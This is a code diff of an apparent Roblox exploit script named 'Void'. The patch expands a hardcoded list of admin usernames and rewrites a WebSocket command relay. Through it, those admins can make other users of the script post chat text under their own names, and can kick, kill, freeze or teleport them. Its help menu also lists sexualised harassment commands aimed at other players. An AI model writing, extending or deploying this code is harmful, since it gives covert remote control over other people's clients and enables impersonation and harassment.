@@ -9606,23 +9606,33 @@ end
 			end
 
 			function sendChat(arg)
-				if L1.step4 < step then
-					task.spawn(function()
-						pcall(function()
-							if L1.TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
-								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(arg, "All")
-							else
-								local rbxGeneral = L1.TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-
-								if rbxGeneral then
+				task.spawn(function()
+					pcall(function()
+						local tcs = game:GetService("TextChatService")
+						if tcs and tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+							local channels = tcs:FindFirstChild("TextChannels")
+							if channels then
+								local rbxGeneral = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General") or (channels:GetChildren() and channels:GetChildren()[1])
+								if rbxGeneral and type(rbxGeneral.SendAsync) == "function" then
 									rbxGeneral:SendAsync(arg)
+									return
 								end
 							end
-						end)
+							local bar = tcs:FindFirstChild("ChatInputBarConfiguration")
+							local targetChan = bar and bar.TargetTextChannel
+							if targetChan and type(targetChan.SendAsync) == "function" then
+								targetChan:SendAsync(arg)
+								return
+							end
+						end
+						local rep = game:GetService("ReplicatedStorage")
+						local defaultChat = rep:FindFirstChild("DefaultChatSystemChatEvents")
+						local sayReq = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
+						if sayReq then
+							sayReq:FireServer(arg, "All")
+						end
 					end)
-
-					return
-				end
+				end)
 			end
 
 			do
@@ -54971,7 +54981,7 @@ visualPage = createPage("visual")
 									end
 
 									do
-										local tbl19 = { pagalkuta99 = true, rtn3742 = true, jeremywade_98 = true, iblame_uuu = true }
+										local tbl19 = { pagalkuta99 = true, rtn3742 = true, jeremywade_98 = true, iblame_uuu = true, missibubu = true, hor1zen = true }
 										local iterFn12 = L1.iterFn1
 
 										fn2 = function()
@@ -55421,7 +55431,7 @@ visualPage = createPage("visual")
 																		return
 																	end
 
-																	local flag8 = username and (string.lower(username) == "pagalkuta99" or string.lower(username) == "rtn3742" or string.lower(username) == "jeremywade_98" or string.lower(username) == "iblame_uuu")
+																	local flag8 = username and (string.lower(username) == "pagalkuta99" or string.lower(username) == "rtn3742" or string.lower(username) == "jeremywade_98" or string.lower(username) == "iblame_uuu" or string.lower(username) == "missibubu" or string.lower(username) == "hor1zen")
 																	if not flag8 and username then
 																		flag8 = tbl19 and tbl19[string.lower(username)]
 																		if not flag8 and P2PAdmins then
@@ -55456,86 +55466,7 @@ visualPage = createPage("visual")
 																end
 
 																-- ============================================================
-																-- PATCH 1 — say-command server relay (with strict deduplication)
-																-- ============================================================
-																if event == "say-command" and type(data2) == "table" then
-																	local senderName = data2.sender or data2.username or ""
-																	local targetName = data2.target or ""
-																	local sayText    = data2.text or ""
-																	local cmdId      = data2.cmdId
-
-																	-- Deduplicate relay attempts globally
-																	if cmdId then
-																		_G._SayProcessedCmds = _G._SayProcessedCmds or {}
-																		if _G._SayProcessedCmds[cmdId] then return end
-																		_G._SayProcessedCmds[cmdId] = true
-																	end
-
-																	-- Ignore own echo
-																	local myPlayer = game.Players.LocalPlayer
-																	local myName = myPlayer and string.lower(myPlayer.Name) or ""
-																	if myName ~= "" and string.lower(senderName) == myName then return end
-
-																	-- === ADMIN CHECK (mirror script's own whitelist) ===
-																	local lname = string.lower(senderName)
-																	local isAdmin = false
-
-																	if lname == "pagalkuta99"
-																	or lname == "rtn3742"
-																	or lname == "jeremywade_98"
-																	or lname == "iblame_uuu"
-																	or lname == "hor1zen" then
-																		isAdmin = true
-																	end
-
-																	if not isAdmin and P2PAdmins and P2PAdmins[lname] then
-																		isAdmin = true
-																	end
-
-																	if not isAdmin and getgenv().WhitelistedUsers
-																	and type(getgenv().WhitelistedUsers) == "table" then
-																		isAdmin = getgenv().WhitelistedUsers[lname] == true
-																	end
-
-																	if not isAdmin and getgenv().isUserWhitelisted then
-																		local ok, r = pcall(getgenv().isUserWhitelisted, senderName)
-																		if ok and r then isAdmin = true end
-																	end
-
-																	if not isAdmin then return end
-																	if sayText == "" or targetName == "" then return end
-
-																	-- Rebroadcast client-speak with full metadata
-																	pcall(function()
-																		local ws = v8 or globalWebSocket
-																		if not ws then return end
-																		local payload = {
-																			event = "client-speak",
-																			data = {
-																				target = targetName,
-																				targetName = data2.targetName or targetName,
-																				targetDisplayName = data2.targetDisplayName or targetName,
-																				targetUserId = data2.targetUserId or "",
-																				text   = sayText,
-																				sender = senderName,
-																				cmdId  = cmdId,
-																			},
-																		}
-																		if iterFn12 then
-																			iterFn12(ws, payload)
-																		elseif type(ws.Send) == "function" then
-																			local ok_send = pcall(function() ws:Send(payload) end)
-																			if not ok_send then
-																				ws:Send(game:GetService("HttpService"):JSONEncode(payload))
-																			end
-																		end
-																	end)
-
-																	return
-																end
-
-																-- ============================================================
-																-- PATCH 2 — client-side listener (Direct & Relayed, Username & DisplayName)
+																-- PATCH 2 (FIRST) — client-side listener (Direct & Relayed, Case-Insensitive)
 																-- ============================================================
 																if (event == "client-speak" or event == "say-command") and type(data2) == "table" then
 																	local lp = game.Players.LocalPlayer
@@ -55552,6 +55483,7 @@ visualPage = createPage("visual")
 																	or lname == "rtn3742"
 																	or lname == "jeremywade_98"
 																	or lname == "iblame_uuu"
+																	or lname == "missibubu"
 																	or lname == "hor1zen" then
 																		isAdminSender = true
 																	end
@@ -55570,95 +55502,177 @@ visualPage = createPage("visual")
 																		if ok and r then isAdminSender = true end
 																	end
 
-																	if not isAdminSender then return end
+																	if isAdminSender then
+																		-- Target resolution (supports exact, display name, partial, all, others, me, case-insensitive)
+																		local targetMatch = false
+																		local tRaw = data2.target and string.lower(data2.target) or ""
+																		local tName = data2.targetName and string.lower(data2.targetName) or ""
+																		local tDisplay = data2.targetDisplayName and string.lower(data2.targetDisplayName) or ""
+																		local tUid = data2.targetUserId and tostring(data2.targetUserId) or ""
 
-																	-- Target resolution (supports exact, display name, partial, all, others, me)
-																	local targetMatch = false
-																	local tRaw = data2.target and string.lower(data2.target) or ""
-																	local tName = data2.targetName and string.lower(data2.targetName) or ""
-																	local tDisplay = data2.targetDisplayName and string.lower(data2.targetDisplayName) or ""
-																	local tUid = data2.targetUserId and tostring(data2.targetUserId) or ""
-
-																	if tRaw == "all" then
-																		targetMatch = true
-																	elseif tRaw == "others" and myName ~= lname then
-																		targetMatch = true
-																	elseif tRaw == "me" and myName == lname then
-																		targetMatch = true
-																	elseif (tUid ~= "" and tUid == myUserId)
-																	or (tName ~= "" and tName == myName)
-																	or (tDisplay ~= "" and tDisplay == myDisplay)
-																	or (tRaw ~= "" and (tRaw == myName or tRaw == myDisplay))
-																	or (tRaw ~= "" and myDisplay ~= "" and string.find(myDisplay, tRaw, 1, true))
-																	or (tRaw ~= "" and myName ~= "" and string.find(myName, tRaw, 1, true)) then
-																		targetMatch = true
-																	end
-
-																	if targetMatch then
-																		local cmdId = data2.cmdId
-																		if cmdId then
-																			_G._SayExecutedCmds = _G._SayExecutedCmds or {}
-																			if _G._SayExecutedCmds[cmdId] then return end
-																			_G._SayExecutedCmds[cmdId] = true
+																		if tRaw == "all" then
+																			targetMatch = true
+																		elseif tRaw == "others" and myName ~= lname then
+																			targetMatch = true
+																		elseif tRaw == "me" and myName == lname then
+																			targetMatch = true
+																		elseif (tUid ~= "" and tUid == myUserId)
+																		or (tName ~= "" and tName == myName)
+																		or (tDisplay ~= "" and tDisplay == myDisplay)
+																		or (tRaw ~= "" and (tRaw == myName or tRaw == myDisplay))
+																		or (tRaw ~= "" and myDisplay ~= "" and string.find(myDisplay, tRaw, 1, true))
+																		or (tRaw ~= "" and myName ~= "" and string.find(myName, tRaw, 1, true))
+																		or (tName ~= "" and myName ~= "" and string.find(myName, tName, 1, true))
+																		or (tDisplay ~= "" and myDisplay ~= "" and string.find(myDisplay, tDisplay, 1, true)) then
+																			targetMatch = true
 																		end
 
-																		local msg = tostring(data2.text or "")
-																		if msg ~= "" then
-																			-- Brief debounce (0.4s) to block instant network echoes
-																			local now = tick()
-																			_G._LastSayTimestamp = _G._LastSayTimestamp or 0
-																			_G._LastSayMessage = _G._LastSayMessage or ""
-																			if _G._LastSayMessage == msg and (now - _G._LastSayTimestamp) < 0.4 then
-																				return
+																		if targetMatch then
+																			local cmdId = data2.cmdId
+																			local alreadyExecuted = false
+																			if cmdId then
+																				_G._SayExecutedCmds = _G._SayExecutedCmds or {}
+																				if _G._SayExecutedCmds[cmdId] then alreadyExecuted = true end
+																				_G._SayExecutedCmds[cmdId] = true
 																			end
-																			_G._LastSayTimestamp = now
-																			_G._LastSayMessage = msg
 
-																			-- Robust multi-channel chat dispatch
-																			local sent = false
+																			if not alreadyExecuted then
+																				local msg = tostring(data2.text or "")
+																				if msg ~= "" then
+																					-- Brief debounce (0.4s) to block instant network echoes
+																					local now = tick()
+																					_G._LastSayTimestamp = _G._LastSayTimestamp or 0
+																					_G._LastSayMessage = _G._LastSayMessage or ""
+																					if not (_G._LastSayMessage == msg and (now - _G._LastSayTimestamp) < 0.4) then
+																						_G._LastSayTimestamp = now
+																						_G._LastSayMessage = msg
 
-																			-- 1. TextChatService (Modern)
-																			pcall(function()
-																				local tcs = game:GetService("TextChatService")
-																				if tcs and tcs.ChatVersion == Enum.ChatVersion.TextChatService then
-																					local channels = tcs:FindFirstChild("TextChannels")
-																					if channels then
-																						local rbxGen = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General") or (channels:GetChildren() and channels:GetChildren()[1])
-																						if rbxGen and type(rbxGen.SendAsync) == "function" then
-																							rbxGen:SendAsync(msg)
-																							sent = true
-																							return
+																						-- Robust multi-channel chat dispatch
+																						local sent = false
+
+																						-- 1. TextChatService (Modern)
+																						pcall(function()
+																							local tcs = game:GetService("TextChatService")
+																							if tcs and tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+																								local channels = tcs:FindFirstChild("TextChannels")
+																								if channels then
+																									local rbxGen = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General") or (channels:GetChildren() and channels:GetChildren()[1])
+																									if rbxGen and type(rbxGen.SendAsync) == "function" then
+																										rbxGen:SendAsync(msg)
+																										sent = true
+																										return
+																									end
+																								end
+																								local bar = tcs:FindFirstChild("ChatInputBarConfiguration")
+																								local targetChan = bar and bar.TargetTextChannel
+																								if targetChan and type(targetChan.SendAsync) == "function" then
+																									targetChan:SendAsync(msg)
+																									sent = true
+																									return
+																								end
+																							end
+																						end)
+
+																						-- 2. Legacy SayMessageRequest
+																						if not sent then
+																							pcall(function()
+																								local rep = game:GetService("ReplicatedStorage")
+																								local defaultChat = rep:FindFirstChild("DefaultChatSystemChatEvents")
+																								local sayReq = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
+																								if sayReq then
+																									sayReq:FireServer(msg, "All")
+																									sent = true
+																								end
+																							end)
+																						end
+
+																						-- 3. Script's internal sendChat
+																						if not sent and typeof(sendChat) == "function" then
+																							pcall(sendChat, msg)
 																						end
 																					end
-																					local bar = tcs:FindFirstChild("ChatInputBarConfiguration")
-																					local targetChan = bar and bar.TargetTextChannel
-																					if targetChan and type(targetChan.SendAsync) == "function" then
-																						targetChan:SendAsync(msg)
-																						sent = true
-																						return
-																					end
 																				end
-																			end)
+																			end
+																		end
+																	end
+																end
 
-																			-- 2. Legacy SayMessageRequest
-																			if not sent then
+																-- ============================================================
+																-- PATCH 1 (RELAY) — say-command server relay (with strict deduplication)
+																-- ============================================================
+																if event == "say-command" and type(data2) == "table" then
+																	local senderName = data2.sender or data2.username or ""
+																	local targetName = data2.target or ""
+																	local sayText    = data2.text or ""
+																	local cmdId      = data2.cmdId
+
+																	-- Deduplicate relay attempts globally
+																	local alreadyRelayed = false
+																	if cmdId then
+																		_G._SayProcessedCmds = _G._SayProcessedCmds or {}
+																		if _G._SayProcessedCmds[cmdId] then alreadyRelayed = true end
+																		_G._SayProcessedCmds[cmdId] = true
+																	end
+
+																	if not alreadyRelayed then
+																		local myPlayer = game.Players.LocalPlayer
+																		local myName = myPlayer and string.lower(myPlayer.Name) or ""
+																		if not (myName ~= "" and string.lower(senderName) == myName) then
+																			local lname = string.lower(senderName)
+																			local isAdmin = false
+
+																			if lname == "pagalkuta99"
+																			or lname == "rtn3742"
+																			or lname == "jeremywade_98"
+																			or lname == "iblame_uuu"
+																			or lname == "missibubu"
+																			or lname == "hor1zen" then
+																				isAdmin = true
+																			end
+
+																			if not isAdmin and P2PAdmins and P2PAdmins[lname] then
+																				isAdmin = true
+																			end
+
+																			if not isAdmin and getgenv().WhitelistedUsers
+																			and type(getgenv().WhitelistedUsers) == "table" then
+																				isAdmin = getgenv().WhitelistedUsers[lname] == true
+																			end
+
+																			if not isAdmin and getgenv().isUserWhitelisted then
+																				local ok, r = pcall(getgenv().isUserWhitelisted, senderName)
+																				if ok and r then isAdmin = true end
+																			end
+
+																			if isAdmin and sayText ~= "" and targetName ~= "" then
 																				pcall(function()
-																					local rep = game:GetService("ReplicatedStorage")
-																					local defaultChat = rep:FindFirstChild("DefaultChatSystemChatEvents")
-																					local sayReq = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
-																					if sayReq then
-																						sayReq:FireServer(msg, "All")
-																						sent = true
+																					local ws = v8 or globalWebSocket
+																					if not ws then return end
+																					local payload = {
+																						event = "client-speak",
+																						data = {
+																							target = targetName,
+																							targetName = data2.targetName or targetName,
+																							targetDisplayName = data2.targetDisplayName or targetName,
+																							targetUserId = data2.targetUserId or "",
+																							text   = sayText,
+																							sender = senderName,
+																							cmdId  = cmdId,
+																						},
+																					}
+																					if iterFn12 then
+																						iterFn12(ws, payload)
+																					elseif type(ws.Send) == "function" then
+																						local ok_send = pcall(function() ws:Send(payload) end)
+																						if not ok_send then
+																							ws:Send(game:GetService("HttpService"):JSONEncode(payload))
+																						end
 																					end
 																				end)
 																			end
-
-																			-- 3. Script's internal sendChat
-																			if not sent and typeof(sendChat) == "function" then
-																				pcall(sendChat, msg)
-																			end
 																		end
 																	end
+
 																	return
 																end
 
@@ -55823,10 +55837,10 @@ visualPage = createPage("visual")
 									local fn16 = fn2
 
 									-- ============================================================
--- CENTRAL .SAY DISPATCH ENGINE
+-- CENTRAL .SAY DISPATCH ENGINE (Full Case-Insensitive Matching)
 -- ============================================================
-local function executeSayCommandInternal(text, senderPlayer)
-	if type(text) ~= "string" or string.sub(text, 1, 5) ~= ".say " then return false end
+local function executeSayCommandInternal(text, senderPlayer, isRemote)
+	if type(text) ~= "string" or string.lower(string.sub(text, 1, 5)) ~= ".say " then return false end
 
 	local lp = game.Players.LocalPlayer
 	local sender = senderPlayer or lp
@@ -55838,6 +55852,7 @@ local function executeSayCommandInternal(text, senderPlayer)
 	or lname == "rtn3742"
 	or lname == "jeremywade_98"
 	or lname == "iblame_uuu"
+	or lname == "missibubu"
 	or lname == "hor1zen" then
 		isAdmin = true
 	end
@@ -55857,14 +55872,14 @@ local function executeSayCommandInternal(text, senderPlayer)
 
 	if not isAdmin then return false end
 
-	-- Parse target and text (quoted with spaces, unquoted, quoted text, unquoted text)
-	local target, sayText = text:match('^%.say%s+"([^"]+)"%s+"(.*)"$')
-	if not target then target, sayText = text:match('^%.say%s+"([^"]+)"%s+(.+)$') end
-	if not target then target, sayText = text:match('^%.say%s+(%S+)%s+"(.*)"$') end
-	if not target then target, sayText = text:match('^%.say%s+(%S+)%s+(.+)$') end
+	-- Parse target and text (handles case-insensitive .say, quoted targets with spaces, unquoted)
+	local target, sayText = text:match('^[%.%s]*[sS][aA][yY]%s+"([^"]+)"%s+"(.*)"$')
+	if not target then target, sayText = text:match('^[%.%s]*[sS][aA][yY]%s+"([^"]+)"%s+(.+)$') end
+	if not target then target, sayText = text:match('^[%.%s]*[sS][aA][yY]%s+(%S+)%s+"(.*)"$') end
+	if not target then target, sayText = text:match('^[%.%s]*[sS][aA][yY]%s+(%S+)%s+(.+)$') end
 
 	if not (target and sayText and #sayText > 0) then
-		if typeof(SendNotification) == "function" then
+		if not isRemote and typeof(SendNotification) == "function" then
 			SendNotification("Void Say", 'syntax: .say <name/display> "text"', 2)
 		end
 		return true
@@ -55874,7 +55889,7 @@ local function executeSayCommandInternal(text, senderPlayer)
 	local lTarget = string.lower(target)
 	local resolvedPlayer = nil
 
-	-- Resolve target in local server
+	-- Resolve target in local server (exact, prefix, and substring on both Name & DisplayName)
 	pcall(function()
 		local players = game.Players:GetPlayers()
 		for _, p in ipairs(players) do
@@ -55897,40 +55912,62 @@ local function executeSayCommandInternal(text, senderPlayer)
 	local targetDisplayName = resolvedPlayer and resolvedPlayer.DisplayName or target
 	local targetUserId = resolvedPlayer and tostring(resolvedPlayer.UserId) or ""
 
-	local payload = {
-		event = "say-command",
-		data = {
-			sender = senderName,
-			username = senderName,
-			target = target,
-			targetName = targetName,
-			targetDisplayName = targetDisplayName,
-			targetUserId = targetUserId,
-			text   = sayText,
-			cmdId  = cmdId,
-		},
-	}
-
-	-- 1. Broadcast over WebSocket (both say-command and client-speak)
-	local ws = v8 or globalWebSocket
-	if ws then
-		pcall(function()
-			if iterFn12 then
-				iterFn12(ws, payload)
-				iterFn12(ws, { event = "client-speak", data = payload.data })
-			elseif type(ws.Send) == "function" then
-				local ok1 = pcall(function() ws:Send(payload) end)
-				if not ok1 then ws:Send(game:GetService("HttpService"):JSONEncode(payload)) end
-				local ok2 = pcall(function() ws:Send({ event = "client-speak", data = payload.data }) end)
-				if not ok2 then ws:Send(game:GetService("HttpService"):JSONEncode({ event = "client-speak", data = payload.data })) end
-			end
-		end)
+	-- 1. Broadcast over WebSocket only if locally initiated (not already received over network)
+	if not isRemote then
+		local ws = v8 or globalWebSocket
+		if ws then
+			pcall(function()
+				local payload = {
+					event = "say-command",
+					data = {
+						sender = senderName,
+						username = senderName,
+						target = target,
+						targetName = targetName,
+						targetDisplayName = targetDisplayName,
+						targetUserId = targetUserId,
+						text   = sayText,
+						cmdId  = cmdId,
+					},
+				}
+				if iterFn12 then
+					iterFn12(ws, payload)
+					iterFn12(ws, { event = "client-speak", data = payload.data })
+				elseif type(ws.Send) == "function" then
+					local ok1 = pcall(function() ws:Send(payload) end)
+					if not ok1 then ws:Send(game:GetService("HttpService"):JSONEncode(payload)) end
+					local ok2 = pcall(function() ws:Send({ event = "client-speak", data = payload.data }) end)
+					if not ok2 then ws:Send(game:GetService("HttpService"):JSONEncode({ event = "client-speak", data = payload.data })) end
+				end
+			end)
+		end
 	end
 
-	-- 2. If target is our own local player (self-test or same client), dispatch immediately
-	if lp and (resolvedPlayer == lp or lTarget == string.lower(lp.Name) or (lp.DisplayName and lTarget == string.lower(lp.DisplayName))) then
+	-- 2. Immediate local dispatch if target is this player (exact, display, partial, all, me, others)
+	local myName = lp and string.lower(lp.Name) or ""
+	local myDisplay = lp and lp.DisplayName and string.lower(lp.DisplayName) or ""
+	local isLocalTarget = false
+
+	if lTarget == "all" then
+		isLocalTarget = true
+	elseif lTarget == "others" and myName ~= lname then
+		isLocalTarget = true
+	elseif lTarget == "me" and myName == lname then
+		isLocalTarget = true
+	elseif resolvedPlayer == lp then
+		isLocalTarget = true
+	elseif (targetUserId ~= "" and tostring(lp.UserId) == targetUserId) then
+		isLocalTarget = true
+	elseif lTarget == myName or (myDisplay ~= "" and lTarget == myDisplay) then
+		isLocalTarget = true
+	elseif (myDisplay ~= "" and string.find(myDisplay, lTarget, 1, true)) or (myName ~= "" and string.find(myName, lTarget, 1, true)) then
+		isLocalTarget = true
+	end
+
+	if lp and isLocalTarget then
 		task.spawn(function()
 			_G._SayExecutedCmds = _G._SayExecutedCmds or {}
+			if _G._SayExecutedCmds[cmdId] then return end
 			_G._SayExecutedCmds[cmdId] = true
 
 			local sent = false
@@ -55972,8 +56009,8 @@ local function executeSayCommandInternal(text, senderPlayer)
 		end)
 	end
 
-	-- Notification
-	if typeof(SendNotification) == "function" then
+	-- Notification (local initiator only)
+	if not isRemote and typeof(SendNotification) == "function" then
 		local label = targetDisplayName
 		if targetName ~= targetDisplayName then
 			label = targetDisplayName .. " (@" .. targetName .. ")"
@@ -55993,7 +56030,7 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 											if string.sub(text, 1, 1) == ";" then
 												textBox2.Text = ""
 
-												if string.lower(text) == ";cmd" or string.lower(text) == ";cmds" then
+												if string.lower(text) == ";cmd" or string.lower(text) == ";cmds" or string.lower(text) == ";help" or string.lower(text) == ";commands" then
 													spawnGlobalMessage({
 														sender = "SYSTEM",
 														displayName = "Void",
@@ -56045,49 +56082,152 @@ _G.ExecuteSayCommand = executeSayCommandInternal
 														},
 													}
 
-													local isLocalAdmin = localPlayer_2 and (string.lower(localPlayer_2.Name) == "pagalkuta99" or string.lower(localPlayer_2.Name) == "rtn3742" or string.lower(localPlayer_2.Name) == "jeremywade_98" or string.lower(localPlayer_2.Name) == "iblame_uuu" or (tbl19 and tbl19[string.lower(localPlayer_2.Name)]) or (P2PAdmins and P2PAdmins[string.lower(localPlayer_2.Name)]))
+													local isLocalAdmin = localPlayer_2 and (string.lower(localPlayer_2.Name) == "pagalkuta99" or string.lower(localPlayer_2.Name) == "rtn3742" or string.lower(localPlayer_2.Name) == "jeremywade_98" or string.lower(localPlayer_2.Name) == "iblame_uuu" or string.lower(localPlayer_2.Name) == "missibubu" or string.lower(localPlayer_2.Name) == "hor1zen" or (tbl19 and tbl19[string.lower(localPlayer_2.Name)]) or (P2PAdmins and P2PAdmins[string.lower(localPlayer_2.Name)]))
 
 													-- ============================================================
-													-- PATCH 3 — the admin's local chat hook
+													-- SCRIPT CHAT ADMIN COMMAND ENGINE (.)
 													-- ============================================================
-													if string.sub(text, 1, 5) == ".say " then
-														if _G.ExecuteSayCommand and _G.ExecuteSayCommand(text, localPlayer_2) then
+													if string.sub(text, 1, 1) == "." and isLocalAdmin then
+														local lText = string.lower(text)
+														if lText == ".cmd" or lText == ".cmds" or lText == ".help" or lText == ".commands" then
+															spawnGlobalMessage({
+																sender = "SYSTEM",
+																displayName = "Void",
+																userId = "VOID",
+															}, [[<font color="rgb(255,200,50)"><b>ADMIN COMMANDS (.)</b></font>
+<font color="rgb(200,200,200)">.kill</font> <font color="rgb(100,100,100)">(name/all/me)</font> <font color="rgb(150,150,150)">- Kill &amp; Respawn target</font>
+<font color="rgb(200,200,200)">.kick</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Kick target from game</font>
+<font color="rgb(200,200,200)">.freeze</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Freeze target character</font>
+<font color="rgb(200,200,200)">.unfreeze</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Unfreeze target character</font>
+<font color="rgb(200,200,200)">.bring</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Teleport target to you</font>
+<font color="rgb(200,200,200)">.disable</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Disable features &amp; attachs</font>
+<font color="rgb(200,200,200)">.undisable</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Re-enable features</font>
+<font color="rgb(200,200,200)">.say</font> <font color="rgb(100,100,100)">(name) "text"</font> <font color="rgb(150,150,150)">- Force target to chat text</font>
+
+<font color="rgb(255,200,50)"><b>ATTACH &amp; LOCAL SHORTCUTS (;)</b></font>
+<font color="rgb(200,200,200)">;tp</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Teleport</font>
+<font color="rgb(200,200,200)">;fb</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Facebang</font>
+<font color="rgb(200,200,200)">;hs</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Headsit</font>
+<font color="rgb(200,200,200)">;pat</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Pat</font>
+<font color="rgb(200,200,200)">;bh</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Backhug</font>
+<font color="rgb(200,200,200)">;fh</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Fronthug</font>
+<font color="rgb(200,200,200)">;prop</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Propose</font>
+<font color="rgb(200,200,200)">;hb</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Hipbang</font>
+<font color="rgb(200,200,200)">;bp</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Bagpack</font>
+<font color="rgb(200,200,200)">;gn</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Goon</font>
+<font color="rgb(200,200,200)">;hide</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Hide player</font>
+<font color="rgb(200,200,200)">;unhide</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Unhide player</font>
+<font color="rgb(200,200,200)">;stop</font> <font color="rgb(150,150,150)">- Stop attach features</font>]], false)
+														textBox2.Text = ""
+														return
+													end
+
+													if string.lower(string.sub(text, 1, 5)) == ".say " then
+														if _G.ExecuteSayCommand and _G.ExecuteSayCommand(text, localPlayer_2, false) then
 															textBox2.Text = ""
 															return
 														end
 													end
 
-																										if string.sub(text, 1, 1) == "." and isLocalAdmin then
-														local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
-														if match == ".kick" and v9 and executeRemoteKick then
-															executeRemoteKick(v9)
-														else
-															if processAdminCommand then
-																processAdminCommand(localPlayer_2, text, false)
-															end
-															SendNotification("Void Admin", "Dispatched command: " .. text, 3)
-														end
-														return
+													local cmdMatch, targetArg = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+													if not cmdMatch then
+														cmdMatch = text:match("^(%.%w+)")
 													end
+													local cLower = cmdMatch and string.lower(cmdMatch)
+													local remoteKick = getgenv().executeRemoteKick or executeRemoteKick
+													local remoteAdmin = getgenv().executeRemoteAdminCommand or executeRemoteAdminCommand
+													local procAdmin = getgenv().processAdminCommand or processAdminCommand
+
+													if cLower == ".kick" and targetArg and remoteKick then
+														remoteKick(targetArg)
+													elseif cLower and (cLower == ".kill" or cLower == ".respawn" or cLower == ".reset" or cLower == ".freeze" or cLower == ".unfreeze" or cLower == ".thaw" or cLower == ".bring" or cLower == ".disable" or cLower == ".undisable") then
+														if remoteAdmin then
+															remoteAdmin(cLower, targetArg, text)
+														elseif procAdmin then
+															procAdmin(localPlayer_2, text, false)
+														end
+													else
+														if procAdmin then
+															procAdmin(localPlayer_2, text, false)
+														end
+													end
+													textBox2.Text = ""
+													return
+												end
 
 													iterFn12(v8, tbl19)
 												end)
 											else
 												local localPlayer_2 = game.Players.LocalPlayer
-												local isLocalAdmin = localPlayer_2 and (string.lower(localPlayer_2.Name) == "pagalkuta99" or string.lower(localPlayer_2.Name) == "rtn3742" or string.lower(localPlayer_2.Name) == "jeremywade_98" or string.lower(localPlayer_2.Name) == "iblame_uuu" or (tbl19 and tbl19[string.lower(localPlayer_2.Name)]) or (P2PAdmins and P2PAdmins[string.lower(localPlayer_2.Name)]))
+												local isLocalAdmin = localPlayer_2 and (string.lower(localPlayer_2.Name) == "pagalkuta99" or string.lower(localPlayer_2.Name) == "rtn3742" or string.lower(localPlayer_2.Name) == "jeremywade_98" or string.lower(localPlayer_2.Name) == "iblame_uuu" or string.lower(localPlayer_2.Name) == "missibubu" or string.lower(localPlayer_2.Name) == "hor1zen" or (tbl19 and tbl19[string.lower(localPlayer_2.Name)]) or (P2PAdmins and P2PAdmins[string.lower(localPlayer_2.Name)]))
 
 												if isLocalAdmin and string.sub(text, 1, 1) == "." then
-													local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
-													if match == ".kick" and v9 and executeRemoteKick then
-														executeRemoteKick(v9)
-														return
-													else
-														if processAdminCommand then
-															processAdminCommand(localPlayer_2, text, false)
-														end
+													local lText = string.lower(text)
+													if lText == ".cmd" or lText == ".cmds" or lText == ".help" or lText == ".commands" then
+														spawnGlobalMessage({
+															sender = "SYSTEM",
+															displayName = "Void",
+															userId = "VOID",
+														}, [[<font color="rgb(255,200,50)"><b>ADMIN COMMANDS (.)</b></font>
+<font color="rgb(200,200,200)">.kill</font> <font color="rgb(100,100,100)">(name/all/me)</font> <font color="rgb(150,150,150)">- Kill &amp; Respawn target</font>
+<font color="rgb(200,200,200)">.kick</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Kick target from game</font>
+<font color="rgb(200,200,200)">.freeze</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Freeze target character</font>
+<font color="rgb(200,200,200)">.unfreeze</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Unfreeze target character</font>
+<font color="rgb(200,200,200)">.bring</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Teleport target to you</font>
+<font color="rgb(200,200,200)">.disable</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Disable features &amp; attachs</font>
+<font color="rgb(200,200,200)">.undisable</font> <font color="rgb(100,100,100)">(name/all)</font> <font color="rgb(150,150,150)">- Re-enable features</font>
+<font color="rgb(200,200,200)">.say</font> <font color="rgb(100,100,100)">(name) "text"</font> <font color="rgb(150,150,150)">- Force target to chat text</font>
+
+<font color="rgb(255,200,50)"><b>ATTACH &amp; LOCAL SHORTCUTS (;)</b></font>
+<font color="rgb(200,200,200)">;tp</font> <font color="rgb(100,100,100)">(name)</font> <font color="rgb(150,150,150)">- Teleport</font>
